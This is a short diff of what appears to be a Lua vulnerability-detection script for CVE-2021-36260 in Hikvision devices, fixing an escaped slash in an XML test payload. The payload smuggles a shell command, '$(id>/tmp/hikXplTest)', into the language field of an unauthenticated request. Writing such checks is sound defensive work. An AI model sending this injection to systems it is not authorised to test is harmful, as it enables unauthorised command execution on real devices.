@@ -51,7 +51,7 @@ end
 
 -- CVE-2021-36260 test payload -- triggers "put" command in parseXMLArgs
 local CVE_2021_36260_PAYLOAD = '<?xml version="1.0" encoding="UTF-8"?>' ..
-  '<language>$(id>%2Ftmp%2FhikXplTest)<\/language>'
+  '<language>$(id>%2Ftmp%2FhikXplTest)</language>'
 
 local function check_cve_2021_36260(host, port)
   -- Step 1: confirm /SDK/webLanguage is accessible without auth
